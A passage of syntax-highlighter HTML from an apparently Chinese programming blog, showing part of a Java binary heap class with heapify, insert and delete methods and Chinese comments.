crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-93\">93</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-94\">94</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-95\">95</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-96\">96</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-97\">97</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-98\">98</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-99\">99</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-100\">100</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-101\">101</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-102\">102</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-103\">103</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-104\">104</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-105\">105</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-106\">106</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-107\">107</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-108\">108</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-109\">109</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-110\">110</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-111\">111</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-112\">112</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-113\">113</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-114\">114</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-115\">115</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-116\">116</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-117\">117</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-118\">118</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-119\">119</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-120\">120</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-121\">121</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-122\">122</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-123\">123</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-124\">124</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-125\">125</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-126\">126</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-127\">127</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-128\">128</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-129\">129</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-130\">130</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-131\">131</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-132\">132</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-133\">133</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-134\">134</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-135\">135</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-136\">136</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-137\">137</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38743a79b669905841-138\">138</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38743a79b669905841-139\">139</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Heap</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">N</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">//default size</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-5\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Heap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-7\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nums</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-8\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-11\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-12\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Heap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-13\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nums</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-15\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-16\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-17\"><span class=\"crayon-c\">\t * heapify an array, O(n)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-18\"><span class=\"crayon-c\">\t * @param nums An array to be heapified. </span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-19\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-20\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">heapify</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-21\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-22\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-23\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-24\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-25\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-26\"><span class=\"crayon-c\">\t * append x to heap</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-27\"><span class=\"crayon-c\">\t * O(logn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-28\"><span class=\"crayon-c\">\t * @param x</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-29\"><span class=\"crayon-c\">\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-30\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-31\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-32\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-33\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">expandSpace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-34\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-35\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-36\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">siftUp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-37\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-38\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-39\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-40\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-41\"><span class=\"crayon-c\">\t * delete an element located in i position.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-42\"><span class=\"crayon-c\">\t * O(logn)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-43\"><span class=\"crayon-c\">\t * @param i</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-44\"><span class=\"crayon-c\">\t * &lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-45\"><span class=\"crayon-c\">\t */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-46\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">delete</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-47\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">rangeCheck</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-48\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-49\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">//将last元素覆盖过来,先siftDown; 再视情况考虑是否siftUp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-50\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">last</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-51\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-52\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">siftDown</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-53\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">//check #i的node的键值是否确实发生改变,若发生改变，则ok,否则为确保堆性质，则需要siftUp; </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-54\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nums</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">last</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-55\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-e\">siftUp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-56\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-57\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38743a79b669905841-58\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38743a79b669905841-59\"><span class=\"crayon-h\">\t</span><span 